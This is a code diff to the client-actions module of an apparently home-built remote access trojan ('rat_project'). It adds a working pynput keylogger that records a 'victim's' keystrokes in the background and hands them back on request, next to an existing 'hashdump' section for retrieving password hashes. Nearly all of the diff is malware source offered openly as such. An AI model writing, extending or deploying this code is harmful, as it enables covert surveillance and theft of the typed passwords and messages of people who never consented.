@@ -16,6 +16,13 @@ from rat_project.utils.logger_config import setup_logger
 
 logger = setup_logger("client.actions")
 
+# ---------------------------------------------------------------------------
+# Keylogger state
+# ---------------------------------------------------------------------------
+
+_keylogger_listener = None  # pynput Listener instance, or None if not running
+_keylogger_buffer: list[str] = []
+
 
 # ---------------------------------------------------------------------------
 # Helpers internes
@@ -209,6 +216,49 @@ def get_system_info() -> str:
 
 
 # ---------------------------------------------------------------------------
+# keylogger — record victim's keystrokes
+# ---------------------------------------------------------------------------
+
+
+def toggle_keylogger() -> str:
+    """
+    Start or stop the keylogger.
+
+    - First call  : starts a background listener, returns a confirmation.
+    - Second call : stops the listener, returns all captured keystrokes.
+
+    Uses pynput.keyboard.Listener which runs in a separate thread.
+    The global state (_keylogger_listener, _keylogger_buffer) is shared
+    between calls — no duplication between start and stop logic.
+
+    Returns:
+        str: Status message, or captured keystrokes on stop.
+    """
+    from pynput import keyboard
+
+    global _keylogger_listener, _keylogger_buffer
+
+    # --- Stop ---
+    if _keylogger_listener is not None:
+        _keylogger_listener.stop()
+        _keylogger_listener = None
+        captured = "".join(_keylogger_buffer)
+        _keylogger_buffer = []
+        logger.info("Keylogger stopped. %d chars captured.", len(captured))
+        return f"Keylogger stopped.\nCaptured keystrokes:\n{captured}"
+
+    # --- Start ---
+    def on_press(key: keyboard.Key) -> None:
+        try:
+            _keylogger_buffer.append(key.char)
+        except AttributeError:
+            # Special keys (Enter, Shift, etc.)
+            _keylogger_buffer.append(f"[{key.name}]")
+
+    _keylogger_listener = keyboard.Listener(on_press=on_press)
+    _keylogger_listener.start()
+    logger.info("Keylogger started.")
+    return "Keylogger started."
 # hashdump — récupération des hashes de mots de passe
 # ---------------------------------------------------------------------------
 
